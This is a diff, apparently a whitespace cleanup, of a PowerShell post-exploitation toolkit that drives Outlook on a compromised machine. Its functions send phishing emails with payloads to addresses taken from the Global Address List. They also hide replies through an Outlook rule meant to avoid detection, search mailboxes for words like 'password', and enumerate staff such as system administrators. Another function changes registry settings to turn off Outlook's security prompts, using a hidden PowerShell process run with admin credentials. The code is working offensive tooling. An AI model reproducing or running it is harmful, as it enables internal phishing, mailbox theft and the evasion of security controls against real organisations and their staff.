@@ -15,11 +15,11 @@ function Invoke-SendMail {
     This function sends emails using a custom or default template to specified target email addresses.
 
     .DESCRIPTION
-    This function sends a specified number of phishing emails to a specific email address or a target list. A payload or URL can be included in the email. The E-Mail will be constructed based on a 
-    template or by specifying the Subject and Body of the email. 
+    This function sends a specified number of phishing emails to a specific email address or a target list. A payload or URL can be included in the email. The E-Mail will be constructed based on a
+    template or by specifying the Subject and Body of the email.
 
     .PARAMETER Targets
-    Array of target email addresses. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List. 
+    Array of target email addresses. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List.
 
     .PARAMETER TargetList
     List of email addresses read from a file. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List.
@@ -28,7 +28,7 @@ function Invoke-SendMail {
     URL to include in the email
 
     .PARAMETER Attachment
-    Full path to the file to use as a payload 
+    Full path to the file to use as a payload
 
     .PARAMETER Template
     Full path to the template html file
@@ -43,13 +43,13 @@ function Invoke-SendMail {
 
     Invoke-SendMail -Targets $Emails -URL "http://bigorg.com/projections.xls" -Subject "Hi" -Body "Please check this <a href='URL'>link</a> out!"
 
-    Send phishing email to the array of target email addresses with an embedded url. 
+    Send phishing email to the array of target email addresses with an embedded url.
 
     .EXAMPLE
 
     Invoke-SendMail -TargetList .\Targets.txt -Attachment .\Notice.rtf -Template .\Phish.html
 
-    Send phishing email to the list of addresses from file and include the specified attachment. 
+    Send phishing email to the list of addresses from file and include the specified attachment.
 
     #>
 
@@ -80,7 +80,7 @@ function Invoke-SendMail {
 
 
 
-    #check for a target list file or the targets parameter 
+    #check for a target list file or the targets parameter
     if($TargetList){
         if(!(Test-Path $TargetList)){
             Throw "Not a valid file path for E-Mail TargetList"
@@ -90,8 +90,8 @@ function Invoke-SendMail {
     elseif($Targets){
         $TargetEmails = $Targets
     }
-    
-    #check if a template is being used 
+
+    #check if a template is being used
     if($Template){
         if(!(Test-Path $Template)){
             Throw "Not a valid file path for E-mail template"
@@ -100,8 +100,8 @@ function Invoke-SendMail {
         $EmailSubject = $Subject
     }
     elseif($Subject -and $Body){
-        $EmailSubject = $Subject 
-        $EmailBody = $Body 
+        $EmailSubject = $Subject
+        $EmailBody = $Body
     }
     else {
         Throw "No email Subject and/or Body specified"
@@ -112,25 +112,25 @@ function Invoke-SendMail {
         $EmailBody = $EmailBody.Replace("URL",$URL)
     }
 
-    #Read the Outlook signature locally if available 
+    #Read the Outlook signature locally if available
     $appdatapath = $env:appdata
     $sigpath = $appdatapath + "\Microsoft\Signatures\*.htm"
 
     if(Test-Path $sigpath){
         $Signature = Get-Content -Path $sigpath
-    } 
-     
+    }
 
-    
+
+
     #Create Outlook rule to automatically sends emails pertaining to phishing emails to deleted items folder
     Invoke-Rule -Subject $Subject -RuleName "RaiderIn"
 
-    #Iterate through the list, craft the emails, and then send it off. 
+    #Iterate through the list, craft the emails, and then send it off.
     ForEach($Target in $TargetEmails){
 
         $Outlook = Get-OutlookInstance
         $Email = $Outlook.CreateItem(0)
-        #If there was an attachment, include it with the email 
+        #If there was an attachment, include it with the email
         if($Attachment){
             $($Email.Attachment).Add($Attachment)
         }
@@ -146,10 +146,10 @@ function Invoke-SendMail {
         Write-Verbose "Sent Email to $Target"
 
         [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
-    } 
+    }
 
-    
-   
+
+
 }
 
 
@@ -159,13 +159,13 @@ function Invoke-Rule {
     .SYNOPSIS
     This function enables an Outlook rule where all received mail items, that match the specified subject flags, will be sent to the deleted items folder
 
-    .DESCRIPTION 
-    This function takes the subject string and other flagged words and applies them to a received items Outlook rule. Any items that match this rule will be 
+    .DESCRIPTION
+    This function takes the subject string and other flagged words and applies them to a received items Outlook rule. Any items that match this rule will be
     sent to the deleted items folder. This allows for the account to be used in phishing for a longer period of time without detection.
 
     .PARAMETER Subject
     The subject string to use in the rule
-    
+
     .LINK
 
     https://social.technet.microsoft.com/forums/windowsserver/en-US/6b25cbd2-2bff-4820-ab53-796e306066eb/defining-custom-outlook-rules-using-powershell
@@ -202,19 +202,19 @@ function Invoke-Rule {
 
     if($Disable){
         $rule = ($($Outlook.session).DefaultStore).GetRules() | Where-Object {$_.Name -eq $RuleName}
-        $rule.enabled = $False 
+        $rule.enabled = $False
     }
     else{
 
         #Check if the Rule has already been created
         $rule = ($($Outlook.session).DefaultStore).GetRules() | Where-Object {(!(Compare-Object $($_.Conditions.Subject).Text $flags))}
         if(!($rule)){
-            #Load the assembly for Outlook objects 
+            #Load the assembly for Outlook objects
             Add-Type -AssemblyName Microsoft.Office.Interop.Outlook | Out-Null
             #$MAPI = $Outlook.GetNamespace('MAPI')
             $inbox = Get-OutlookFolder -Name "Inbox"
             $DeletedFolder = Get-OutlookFolder -Name "DeletedItems"
-            #Retrieve all Outlook rules 
+            #Retrieve all Outlook rules
             $rules = $MAPI.DefaultStore.GetRules()
             $rule = $rules.create($RuleName, [Microsoft.Office.Interop.Outlook.OlRuleType]::OlRuleReceive)
 
@@ -234,17 +234,17 @@ function Invoke-Rule {
             try {
                 $rules.Save()
                 Write-Verbose "Saved Outlook Rule with name: $Rulename"
-            } 
+            }
             catch {
                 Write-Warning "Unable to save inbound rule with name: $RuleName"
             }
         }
-        
+
     }
 
 
-    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null 
-    
+    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
+
 
 }
 
@@ -259,7 +259,7 @@ function Get-OSVersion {
 
     #>
 
-    #function to grab the major and minor verions to determine the OS. 
+    #function to grab the major and minor verions to determine the OS.
     Write-Verbose "Detecting OS..."
     $OS = [environment]::OSVersion.Version
 
@@ -294,7 +294,7 @@ function Get-OSVersion {
         $OSArch = 32
     }
     $OSVersion
-    $OSArch 
+    $OSArch
 }
 
 function Select-EmailItem {
@@ -322,10 +322,10 @@ function Select-EmailItem {
         [int]$Num
     )
 
-    $EmailItem = $FolderObj.Items | Select-Object -Index $Num 
+    $EmailItem = $FolderObj.Items | Select-Object -Index $Num
 
     $EmailItem | Select-Object To,SenderName,SenderEmailAddress,Subject,Body,SentOn,ReceivedTime
-    
+
 }
 
 
@@ -358,7 +358,7 @@ function View-Email {
     )
 
 
-    $OF = Get-OutlookFolder -Name $FolderName 
+    $OF = Get-OutlookFolder -Name $FolderName
     Select-EmailItem -FolderObj $OF -Num $Index
 }
 
@@ -368,9 +368,9 @@ function Get-OutlookFolder {
     This functions returns one of the Outlook top-level, default folders
 
     .PARAMETER Name
-    Name of the desired folder. Default name is Inbox. 
+    Name of the desired folder. Default name is Inbox.
 
-    .EXAMPLE 
+    .EXAMPLE
     Get-OutlookFolder -Name "Inbox"
 
     #>
@@ -454,8 +454,8 @@ function Get-EmailItems {
         [Parameter(Mandatory = $False)]
         [switch]$FullObject
     )
-    
-    
+
+
     if($MaxEmails){
         Write-Verbose "Selecting the first $MaxEmails emails"
         $Items = $Folder.Items | Select-Object -First $MaxEmails
@@ -472,7 +472,7 @@ function Get-EmailItems {
 
             $Email = New-Object PSObject -Property @{
                 To = $_.To
-                FromName = $_.SenderName 
+                FromName = $_.SenderName
                 FromAddress = $_.SenderEmailAddress
                 Subject = $_.Subject
                 Body = $_.Body
@@ -490,9 +490,9 @@ function Get-EmailItems {
         Write-Verbose "Obtained full Email Item objects...."
         $Emails = $Items | Sort-Object -Property SentOn -Descending
     }
-    
 
-    $Emails 
+
+    $Emails
 
 
 }
@@ -505,10 +505,10 @@ function Invoke-MailSearch {
     any matches found.
 
     .DESCRIPTION
-    This function searches the given Outlook folder for items containing the specified keywords and returns any matches found. 
+    This function searches the given Outlook folder for items containing the specified keywords and returns any matches found.
 
     .PARAMETER DefaultFolder
-    Folder to search in. Default is the Inbox. 
+    Folder to search in. Default is the Inbox.
 
     .PARAMETER Keywords
     Keyword/s to search for.
@@ -520,15 +520,15 @@ function Invoke-MailSearch {
     Maximum number of emails to search through
 
     .PARAMETER MaxThreads
-    Maximum number of threads to use when searching 
+    Maximum number of threads to use when searching
 
     .PARAMETER File
     Path to results file
-    
+
     .EXAMPLE
     Invoke-MailSearch -Keyword "password" -MaxResults 20 -MaxThreads 30
 
-    Conduct a search on the Inbox with admin and password specified as keywords. Return a maximum of 20 results. 
+    Conduct a search on the Inbox with admin and password specified as keywords. Return a maximum of 20 results.
 
     #>
 
@@ -553,16 +553,16 @@ function Invoke-MailSearch {
         [string]$File
     )
 
-    #Variable to hold the results 
+    #Variable to hold the results
     $ResultsList = @()
 
-  
+
     $SearchEmailBlock = {
 
         param($Regex, $MailItem)
         $Subject = $MailItem.Subject
-        $Body = $MailItem.Body 
-        
+        $Body = $MailItem.Body
+
         if(($($Regex.Match($Subject)).Success) -or ($($Regex.Match($Body)).Success)){
             $MailItem
         }
@@ -575,10 +575,10 @@ function Invoke-MailSearch {
         $Emails = Get-EmailItems -Folder $OF -FullObject -MaxEmails $MaxSearch
     }
     else {
-        $Emails = Get-EmailItems -Folder $OF -FullObject   
+        $Emails = Get-EmailItems -Folder $OF -FullObject
     }
 
-    #Create regex for keywords 
+    #Create regex for keywords
     if($Keywords.Count -gt 1){
         $count = $Keywords.Count - 2
         for($i = 0; $i -lt $count; $i++){
@@ -587,14 +587,14 @@ function Invoke-MailSearch {
 
         [string]$Keywords = $Keywords -join ''
         $Keywords = "\b($Keywords)\b"
-        
+
     }
     else {
         $Keywords =  "\b($Keywords)\b"
     }
 
     $Regex = [regex]$Keywords
-        
+
 
     Write-Verbose "[*] Searching through $($Emails.count) emails....."
 
@@ -604,19 +604,19 @@ function Invoke-MailSearch {
     $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
     $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
-    #Get all the current variables for this runspace 
+    #Get all the current variables for this runspace
     $MyVars = Get-Variable -Scope 1
 
     $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumfunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
-    #Add the variables from the current runspace to the new runspace 
+    #Add the variables from the current runspace to the new runspace
     ForEach($Var in $MyVars){
         if($VorbiddenVars -notcontains $Var.Name){
             $sessionState.Variables.Add((New-Object -Typename System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
         }
     }
 
-    
+
     Write-Verbose "Creating RunSpace Pool"
     $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
     $pool.Open()
@@ -653,7 +653,7 @@ function Invoke-MailSearch {
 
     }
 
-    $waitTimeout = Get-Date 
+    $waitTimeout = Get-Date
 
     while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
         Start-Sleep -Milliseconds 500
@@ -662,10 +662,10 @@ function Invoke-MailSearch {
     for ($x = 0; $x -lt $counter; $x++){
 
         try {
-            
+
             $result = $ps[$x].EndInvoke($jobs[$x])
             if($result){
-                $ResultsList += $result 
+                $ResultsList += $result
             }
 
         }
@@ -681,7 +681,7 @@ function Invoke-MailSearch {
 
     $pool.Dispose()
 
-    
+
 
     If($MaxResults){
         $ResultsList = $ResultsList | Select-Object -First $MaxResults
@@ -689,14 +689,14 @@ function Invoke-MailSearch {
 
     If($File){
 
-        $ResultsList | Select-Object SenderName,SenderEmailAddress,ReceivedTime,To,Subject,Body | Out-File $File 
-        
+        $ResultsList | Select-Object SenderName,SenderEmailAddress,ReceivedTime,To,Subject,Body | Out-File $File
+
     }
     else {
         $ResultsList | Select-Object SenderName,SenderEmailAddress,ReceivedTime,To,Subject,Body
-        
+
     }
-    
+
 }
 
 function Get-SubFolders {
@@ -712,8 +712,8 @@ function Get-SubFolders {
 
     .EXAMPLE
     Get-SubFolders -FolderName "SentMail"
-    
-    Get a list of folders and sub-folders from the sentmail box. 
+
+    Get a list of folders and sub-folders from the sentmail box.
     #>
 
 
@@ -726,7 +726,7 @@ function Get-SubFolders {
         [switch]$FullObject
     )
 
-    $SubFolders = (Get-OutlookFolder -Name $DefaultFolder).Folders 
+    $SubFolders = (Get-OutlookFolder -Name $DefaultFolder).Folders
 
     If(!($SubFolders)){
         Throw "No subfolders were found for folder: $($Folder.Name)"
@@ -735,9 +735,9 @@ function Get-SubFolders {
     if(!($FullObject)){
         $SubFolders = $SubFolders | ForEach {$_.Name}
     }
-    
-    $SubFolders 
-    
+
+    $SubFolders
+
 }
 
 function Get-GlobalAddressList {
@@ -746,13 +746,13 @@ function Get-GlobalAddressList {
     This function returns an array of Contact objects from a Global Address List object.
 
     .PARAMETER Outlook
-    The MAPI namespace object for Outlook 
+    The MAPI namespace object for Outlook
 
-    .EXAMPLE 
+    .EXAMPLE
 
     Get-GlobalAddressList -MAPI $MAPI
 
-    Return the GAL for the MAPI namespace 
+    Return the GAL for the MAPI namespace
 
     #>
 
@@ -771,15 +771,15 @@ function Get-GlobalAddressList {
     $GAL = $MAPI.GetGlobalAddressList()
 
     $GAL = $GAL.AddressEntries
-    
-    $GAL 
+
+    $GAL
 }
 
 function Invoke-SearchGAL {
 
     <#
     .SYNOPSIS
-    This function returns any users that match the exchange criteria specified. 
+    This function returns any users that match the exchange criteria specified.
 
     .DESCRIPTION
     This fuction returns any exchange users that match the specified search criteria. Searchable fields are FirstName, LastName, JobTitle, Email-Address, and Department
@@ -788,22 +788,22 @@ function Invoke-SearchGAL {
     Full Name to search for
 
     .PARAMETER JobTitle
-    Job Title to search for 
+    Job Title to search for
 
     .PARAMETER  Email
     E-Mail Address to search for
 
     .PARAMETER  Dept
-    Department to search for 
+    Department to search for
 
     .PARAMETER MaxThreads
-    The maximum number of threads to use when searching. The default is set to 15. 
-    
-    .EXAMPLE 
+    The maximum number of threads to use when searching. The default is set to 15.
 
-    Invoke-SearchGAL -JobTitle "System Administrator" -MaxThreads 30 
+    .EXAMPLE
 
-    Search the GAL with 30 threads, for any Exchange Users with the JobTitle "System Administrator". 
+    Invoke-SearchGAL -JobTitle "System Administrator" -MaxThreads 30
+
+    Search the GAL with 30 threads, for any Exchange Users with the JobTitle "System Administrator".
 
 
     #>
@@ -840,9 +840,9 @@ function Invoke-SearchGAL {
     }
 
     $GAL = $UserList
-    
+
     #$User = $GAL | Where-Object {($($_.GetExchangeUser()).FirstName -eq $FirstName) -and ($($_.GetExchangeUser()).LastName -eq $LastName)}
-    
+
     $SearchScript = {
         param($Regex,$Type,$User)
 
@@ -875,19 +875,19 @@ function Invoke-SearchGAL {
     $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
     $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
-    #Get all the current variables for this runspace 
+    #Get all the current variables for this runspace
     $MyVars = Get-Variable -Scope 1
 
     $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumfunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
-    #Add the variables from the current runspace to the new runspace 
+    #Add the variables from the current runspace to the new runspace
     ForEach($Var in $MyVars){
         if($VorbiddenVars -notcontains $Var.Name){
             $sessionState.Variables.Add((New-Object -Typename System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
         }
     }
 
-    
+
     Write-Verbose "Creating RunSpace Pool"
     $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
     $pool.Open()
@@ -926,7 +926,7 @@ function Invoke-SearchGAL {
 
     }
 
-    $waitTimeout = Get-Date 
+    $waitTimeout = Get-Date
 
     while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
         Start-Sleep -Milliseconds 500
@@ -935,10 +935,10 @@ function Invoke-SearchGAL {
     for ($x = 0; $x -lt $counter; $x++){
 
         try {
-            
+
             $result = $ps[$x].EndInvoke($jobs[$x])
             if($result){
-                $ResultsList += $result 
+                $ResultsList += $result
             }
 
         }
@@ -954,7 +954,7 @@ function Invoke-SearchGAL {
 
     $pool.Dispose()
 
-    $ResultsList 
+    $ResultsList
 
     [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
 
@@ -967,10 +967,10 @@ function Get-SMTPAddress {
     Gets the PrimarySMTPAddress of a user.
 
     .DESCRIPTION
-    This function returns the PrimarySMTPAddress of a user via the ExchangeUser object. 
+    This function returns the PrimarySMTPAddress of a user via the ExchangeUser object.
 
     .PARAMETER FullName
-    First and Last name of the user separated by a space. 
+    First and Last name of the user separated by a space.
 
     .OUTPUTS
     System.String . Primary email address of the user.
@@ -985,12 +985,12 @@ function Get-SMTPAddress {
 
     $Outlook = Get-OutlookInstance
     $MAPI = $Outlook.GetNamespace('MAPI')
-    #Grab the GAL 
-    $GAL = Get-GlobalAddressList -MAPI $MAPI 
+    #Grab the GAL
+    $GAL = Get-GlobalAddressList -MAPI $MAPI
 
     #If the full name is given, try to obtain the exchange user object
 
-    $PrimarySMTPAddresses = @() 
+    $PrimarySMTPAddresses = @()
     If($FullNames){
         ForEach($Name in $FullNames){
             try{
@@ -1022,21 +1022,21 @@ function Disable-SecuritySettings {
 
     <#
     .SYNOPSIS
-    This function checks for the existence of the Outlook security registry keys ObjectModelGuard, PromptOOMSend, and AdminSecurityMode. If 
+    This function checks for the existence of the Outlook security registry keys ObjectModelGuard, PromptOOMSend, and AdminSecurityMode. If
     the keys exist, overwrite with the appropriate values to disable to security prompt for programmatic access.
 
     .DESCRIPTION
-    This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. This function must be 
-    run in an administrative context in order to set the values for the registry keys. 
+    This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. This function must be
+    run in an administrative context in order to set the values for the registry keys.
 
     .PARAMETER Version
-    The version of microsoft outlook. This is pertinent to the location of the registry keys. 
+    The version of microsoft outlook. This is pertinent to the location of the registry keys.
 
     .EXAMPLE
     Disable-SecuritySettings -Version 15
 
     #>
-    
+
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $False)]
@@ -1051,7 +1051,7 @@ function Disable-SecuritySettings {
 
     $count = 0
 
-    #Check AV to see if it's up to date. 
+    #Check AV to see if it's up to date.
     $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct
     if($AV){
         $AVstate = $AV.productState
@@ -1068,22 +1068,22 @@ function Disable-SecuritySettings {
         }
         else{
             Write-Verbose "Unable to determine AV status"
-            $AVUpdated = $False 
+            $AVUpdated = $False
         }
     }
     else{
         Write-Verbose "AV not installed"
         $AVUpdated = $False
     }
-    
+
 
     $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\outlook\Security"
-        
+
     $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"
 
     $ObjectModelGuard = "ObjectModelGuard"
     $PromptOOMSend = "PromptOOMSend"
-    $AdminSecurityMode = "AdminSecurityMode" 
+    $AdminSecurityMode = "AdminSecurityMode"
 
     $cmd = " "
 
@@ -1091,62 +1091,62 @@ function Disable-SecuritySettings {
         #if the key does not exists, create or update the appropriate reg keys values.
         $cmd = "New-Item $LMSecurityKey -Force; "
         $cmd += "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force; "
-       
+
 
     }
     else{
 
-        $currentValue = (Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard -ErrorAction SilentlyContinue).ObjectModelGuard 
+        $currentValue = (Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard -ErrorAction SilentlyContinue).ObjectModelGuard
         if($currentValue -and ($currentValue -ne 2)){
-            
+
             $cmd = "Set-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -Force; "
         }
         elseif(!($currentValue)) {
             $cmd = "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force; "
         }
-    
-                
+
+
     }
     if(!(Test-Path $CUSecurityKey)){
 
         $cmd += "New-Item $CUSecurityKey -Force; "
-        $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force; " 
+        $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force; "
         $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force; "
-      
+
     }
     else{
         $currentValue = (Get-ItemProperty $CUSecurityKey -Name PromptOOMSend -ErrorAction SilentlyContinue).PromptOOMSend
         if($currentValue -and ($currentValue -ne 2)){
-            
+
             $cmd += "Set-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -Force; "
-            
+
         }
         elseif(!($currentValue)) {
              $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force; "
         }
-        
-        $currentValue = (Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode -ErrorAction SilentlyContinue).AdminSecurityMode 
+
+        $currentValue = (Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode -ErrorAction SilentlyContinue).AdminSecurityMode
         if($currentValue -and ($currentValue -ne 3)){
-            
+
             $cmd += "Set-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -Force"
-            
+
         }
         elseif(!($currentValue)) {
             $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force"
         }
-                  
+
     }
 
     if($AdminUser -and $AdminPassword){
 
-        #If creds are given start a new powershell process and run the commands. Unable to use the Credential parameter with 
+        #If creds are given start a new powershell process and run the commands. Unable to use the Credential parameter with
         $pw = ConvertTo-SecureString $AdminPassword -asplaintext -Force
         $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $AdminUser,$pw
         $WD = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\'
         $Arg = " -WindowStyle hidden -Command $cmd"
         Start-Process "powershell.exe" -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg
         $count += 1
-        
+
 
     }
     else{
@@ -1161,9 +1161,9 @@ function Disable-SecuritySettings {
             }
         }
         $count += 1
-        
+
     }
-    
+
 
     if($count -eq 1){
         Write-Verbose "Success"
@@ -1209,9 +1209,9 @@ function Reset-SecuritySettings {
 
     $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"
 
-        
-        
-    #if the old value exists, that means the registry key was set and not created. 
+
+
+    #if the old value exists, that means the registry key was set and not created.
     if(Test-Path $LMSecurityKey){
         #If the key exists, remove it.
         $cmd = "Remove-ItemProperty -Path $LMSecurityKey -Name ObjectModelGuard -Force;"
@@ -1219,7 +1219,7 @@ function Reset-SecuritySettings {
 
     if(Test-Path $CUSecurityKey){
 
-        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name PromptOOMSend -Force;" 
+        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name PromptOOMSend -Force;"
         $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name AdminSecurityMode -Force"
 
     }
@@ -1230,7 +1230,7 @@ function Reset-SecuritySettings {
         $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $AdminUser,$pw
         $WD = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\'
         $Arg = " -WindowStyle hidden -Command $cmd"
-        Start-Process powershell.exe -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg 
+        Start-Process powershell.exe -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg
     }
     else {
         try {
@@ -1247,12 +1247,12 @@ function Reset-SecuritySettings {
 function Get-OutlookInstance {
     <#
     .SYNOPSIS
-    Get an instance of Outlook. This function must be executed in the same user context of the Outlook application. 
+    Get an instance of Outlook. This function must be executed in the same user context of the Outlook application.
 
     .EXAMPLE
     Get-OutlookInstance
 
-    Get an instance of Outlook 
+    Get an instance of Outlook
 
     #>
     try {
@@ -1261,10 +1261,9 @@ function Get-OutlookInstance {
     catch {
         Throw "Unable to open Outlook ComObject"
     }
-    
+
 
     $Outlook
 
 
 }
-
